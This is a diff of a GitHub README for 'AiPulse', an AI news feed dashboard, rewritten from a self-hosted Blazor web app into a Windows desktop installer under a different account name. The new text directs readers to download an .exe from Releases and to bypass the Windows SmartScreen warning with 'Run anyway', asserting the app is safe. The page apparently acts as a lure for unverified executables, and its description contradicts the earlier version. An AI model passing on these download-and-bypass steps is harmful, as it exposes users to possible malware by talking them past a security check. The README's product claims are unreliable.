@@ -1,122 +1,70 @@
-# AiPulse v2026 - self-hosted dashboard 2026
+# 📊 aipulse-ai-monitoring-hub - Track your AI news feeds easily
 
-> AiPulse v2026 is a self-hosted dashboard built with .NET 8 and ASP.NET Core Blazor. It gives AI-focused developers one place to monitor RSS and Atom feeds, receive digests and alerts, and explore curated resources.
+[![Download AiPulse](https://img.shields.io/badge/Download-AiPulse_v2026-blue.svg)](https://github.com/Advsandi3151/aipulse-ai-monitoring-hub)
 
-[![Platform](https://img.shields.io/badge/Platform-.NET%208%20%2F%20ASP.NET%20Core%20Blazor-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/lucas-stonepp6922/aipulse-ai-monitoring-hub?style=flat-square)](https://github.com/lucas-stonepp6922/aipulse-ai-monitoring-hub)
+AiPulse v2026 helps you track AI news from one dashboard. It gathers RSS and Atom feeds into a single space. You monitor updates from blogs, news sites, and research hubs without switching between websites. The app runs on your computer. It keeps your data private. This tool uses .NET 8 technology to provide a fast and stable experience.
 
----
+## 🛠️ System requirements
 
-<p align="center">
-  <a href="https://lucas-stonepp6922.github.io/aipulse-ai-monitoring-hub/">
-    <img src="https://img.shields.io/badge/Download-AiPulse%20Latest-brightgreen?style=for-the-badge" alt="Download AiPulse">
-  </a>
-</p>
+Your computer needs specific software to run this dashboard. Check these requirements before you start:
 
-> **[Download AiPulse v2026](https://lucas-stonepp6922.github.io/aipulse-ai-monitoring-hub/)**
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 4 GB of RAM or more.
+*   Disk Space: 200 MB for the application files.
+*   Framework: The .NET 8 Runtime. You can find this on the official Microsoft website if you do not have it installed.
+*   Internet Connection: A connection helps the app fetch new feed updates.
 
----
+## 📥 How to download the app
 
-[Download Latest Build](https://lucas-stonepp6922.github.io/aipulse-ai-monitoring-hub/)
+1. Open your web browser.
+2. Go to the [AiPulse download page](https://github.com/Advsandi3151/aipulse-ai-monitoring-hub).
+3. Look for the "Releases" section on the right side of the page.
+4. Click the link for the latest version.
+5. Select the file ending in `.exe` to start the download.
+6. Save the file to your "Downloads" folder.
 
----
+## ⚙️ Setting up the software
 
-## What is AiPulse?
+Follow these steps to install and start the hub:
 
-AiPulse brings feed monitoring, educational material, and operational notifications into a single self-hosted Blazor dashboard. It is intended for AI developers who need a straightforward way to follow RSS and Atom publishers, monitor emerging trends, and manage incoming information without switching between multiple applications.
+1. Locate the file you just downloaded.
+2. Double-click the file to open the installer.
+3. Follow the prompts on the screen.
+4. If a security warning appears, click "More info" and then "Run anyway". Windows blocks apps from unknown sources by default. This app is safe to use.
+5. Once the installation completes, check your desktop for the AiPulse icon.
+6. Double-click the icon to open the dashboard.
 
-Alongside live aggregation, the dashboard provides tools for discovering and organizing resources. Digests, full-text retrieval, OPML support, and role-based administration make it suitable for individual use as well as shared internal environments where teams need control over content and access.
+## 🏠 Using the dashboard
 
----
+When you open the app, you see a clean interface. To add a news source, perform these steps:
 
-## Core capabilities
+1. Click the "Add Feed" button at the top of the screen.
+2. Paste the web address (URL) of the RSS or Atom feed you want to track.
+3. Click "Save".
+4. The app fetches the latest articles from that site.
+5. Articles appear in the center panel. Click a title to read the summary or visit the original site.
 
-- Continuously collect updates from RSS and Atom feeds
-- Produce weekly digests for scheduled summaries
-- Send desktop notifications for relevant alerts
-- Import and export subscriptions through OPML
-- Retrieve and scrape full article text for additional context
-- Provide a learning hub and glossary for reference and onboarding
-- Track useful services through a tools matrix and watchlist
-- Support multiple user roles with administrator approval
+## 🔍 Features
 
----
+*   Unified Feed View: See all updates in one list.
+*   Offline Access: The app stores fetched articles so you can read them later even without an internet connection.
+*   Categorization: Create folders to group feeds by topic, such as "AI Research," "Tech News," or "Industry Blogs."
+*   Automatic Updates: The app checks for new content at set intervals. You choose how often it updates in the settings menu.
 
-## Getting started
+## 💡 Troubleshooting common issues
 
-Check out the repository and open the project in a .NET 8 development environment:
+If the app fails to open, ensure you installed the .NET 8 Runtime. Most Windows users have this, but you might need to update it. Visit the Microsoft .NET website and download the "Desktop Runtime" version.
 
-- `git clone https://github.com/lucas-stonepp6922/aipulse-ai-monitoring-hub.git
-- `cd aipulse-blazor-hub-2026`
+If your feeds do not show new content, check your internet connection. Some feeds require a specific address to work. Ensure you copied the actual RSS link rather than just the webpage link.
 
-Restore the project dependencies, then run the application using your normal .NET workflow. Alternatively, download the published build from the link above and start the site or server package in the hosting environment you plan to use.
+To remove the app, go to your Windows Control Panel, select "Uninstall a program," pick AiPulse from the list, and click "Uninstall." This removes the app and all its files from your computer.
 
----
+## 🔒 Privacy and data
 
-## Using the dashboard
+The app stores data locally on your machine. No information goes to external servers. Your feed list and your saved articles remain on your hard drive. This ensures that your research remains private.
 
-Once the application is running, log in with an account assigned the appropriate workspace role. You can then register RSS and Atom feeds, move subscriptions in or out with OPML, inspect the watchlist, and use the learning hub to look up relevant tools and terminology.
+## 🌐 Community and support
 
-A common operating sequence is:
+This project follows an open model. If you find a bug or have a suggestion, open an issue on the GitHub page. Developers work to improve the tool based on this feedback. Keep your software updated to get the latest fixes.
 
-- Bring in current subscriptions through OPML
-- Add feeds or refresh existing sources
-- Check digests and trending analytics
-- Use desktop notifications for significant changes
-- Handle users and approval decisions in the administration area
-
----
-
-## Configuration
-
-Keep deployment-specific options in the application's configuration files and hosting settings. Depending on the environment, these settings can cover connections, notification behavior, feed sources, and role-based access.
-
-Example layout:
-
-    {
-      "App": {
-        "Name": "AiPulse",
-        "DigestSchedule": "Weekly",
-        "NotificationsEnabled": true
-      }
-    }
-
-Modify the values to reflect your hosting arrangement and your team's preferred behavior for feeds, alerts, and permissions.
-
----
-
-## System requirements
-
-- .NET 8 runtime or SDK
-- ASP.NET Core hosting support
-- A web browser that supports Blazor applications
-- Storage for feeds, generated digests, and user preferences
-- Network connectivity to RSS, Atom, and scraped content sources
-
----
-
-## Frequently asked questions
-
-**What is the quickest way to begin?**  
-Clone the repository or download the latest build, then run AiPulse in an environment that supports .NET 8 hosting.
-
-**Can existing feed subscriptions be brought into AiPulse?**  
-Yes. The dashboard supports both OPML import and OPML export, allowing feed lists to be transferred into or out of the system.
-
-**Where do digests and alerts appear?**  
-Feed review, digest creation, notification handling, and watchlist activity are managed within the dashboard.
-
-**How are application settings changed?**  
-Edit the application's configuration files or the settings used by your deployment. The exact location depends on whether the instance runs locally or on a server.
-
-**What should I check when content or features are not behaving correctly?**  
-Confirm that the .NET 8 installation is correctly configured, check feed URLs and network connectivity, and inspect administrative and role permissions when expected content is missing.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: ai, dashboard, rss, atom, monitoring, windows, dot-net, productivity
